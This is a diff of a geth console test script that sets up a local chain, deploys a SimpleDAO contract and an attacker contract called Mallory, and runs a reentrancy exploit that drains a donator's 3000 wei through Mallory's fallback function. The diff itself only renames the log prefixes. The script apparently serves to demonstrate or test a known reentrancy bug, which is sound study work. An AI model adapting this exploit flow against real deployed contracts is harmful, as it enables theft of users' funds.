@@ -1,9 +1,9 @@
 var me = eth.accounts[0];
-console.log("Me: " + me + " and my balance: " + eth.getBalance(me));
+console.log("Test ::: Me: " + me + " and my balance: " + eth.getBalance(me));
 
 miner.start(1);
 
-console.log("ECF Checker ::: Creating SimpleDAO contract:");
+console.log("Test ::: Creating SimpleDAO contract:");
 var simpledaoContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"queryCredit","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"credit","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]);
 var simpledaoAddr;
 var simpledao = simpledaoContract.new(
@@ -15,9 +15,9 @@ var simpledao = simpledaoContract.new(
     if (typeof contract.address !== 'undefined') {
 	simpledaoAddr = contract.address;
 
-	console.log("ECF Checker ::: Created SimpleDAO contract: " + simpledaoAddr);
+	console.log("Test ::: Created SimpleDAO contract: " + simpledaoAddr);
 
-	console.log("ECF Checker ::: Creating Mallory contract:");
+	console.log("Test ::: Creating Mallory contract:");
 	var malloryContract = web3.eth.contract([{"constant":true,"inputs":[],"name":"dao","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"getJackpot","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"addr","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
 
 	var malloryAddr;
@@ -32,29 +32,29 @@ var simpledao = simpledaoContract.new(
 		malloryAddr=mallory.address;
 
 		mallory = malloryContract.at(malloryAddr);
-		console.log("ECF Checker ::: Created Mallory contract: " + malloryAddr);
+		console.log("Test ::: Created Mallory contract: " + malloryAddr);
 
 		var donator=eth.accounts[1];
-		console.log("ECF Checker ::: Mallory is me: " + me);
-		console.log("ECF Checker ::: Real Mallory contract: " + malloryAddr);
-		console.log("ECF Checker ::: SimpleDAO contract: " + simpledaoAddr);
-		console.log("ECF Checker ::: The victim of the bug - a donator: " + donator);
+		console.log("Test ::: Mallory is me: " + me);
+		console.log("Test ::: Real Mallory contract: " + malloryAddr);
+		console.log("Test ::: SimpleDAO contract: " + simpledaoAddr);
+		console.log("Test ::: The victim of the bug - a donator: " + donator);
 
 
-		console.log("ECF Checker ::: Donate 1000 wei to mallory");
+		console.log("Test ::: Donate 1000 wei to Mallory - Call SimpleDAO.donate() ...");
 		simpledao.donate(malloryAddr, {from: me, value: 1000}); // Donate 1000 wei to mallory
 		admin.sleepBlocks(3);
 
-		console.log("ECF Checker ::: Donate 3000 wei to account 0");
+		console.log("Test ::: Donate 3000 wei to account 0 - Call SimpleDAO.donate() ...");
 		simpledao.donate(donator, {from: me, value: 3000}); // Donate 3000 wei to account 0
 		admin.sleepBlocks(3);
 
-		console.log("ECF Checker ::: Before: simpledao has " + eth.getBalance(simpledaoAddr) + " and mallory has " + eth.getBalance(malloryAddr));
+		console.log("Test ::: Before: SimpleDAO has " + eth.getBalance(simpledaoAddr) + " and Mallory has " + eth.getBalance(malloryAddr));
 
-		console.log("ECF Checker ::: Send 1 wei to mallory");
+		console.log("Test ::: Send 1 wei to Mallory contract - sendTransaction() ...");
 		eth.sendTransaction({from: me, to: malloryAddr, value: 1, gas: 500000}); // Send 1 wei to mallory in order to invoke fallback function, will cause mallory to gain 1 wei + 3k wei stolen, totaling to 4k+1 wei.
 		admin.sleepBlocks(3);
-		console.log("ECF Checker ::: After: simpledao has " + eth.getBalance(simpledaoAddr) + " and mallory has " + eth.getBalance(malloryAddr));
+		console.log("Test ::: After: SimpleDAO has " + eth.getBalance(simpledaoAddr) + " and Mallory has " + eth.getBalance(malloryAddr));
 
 	    }
 	 });
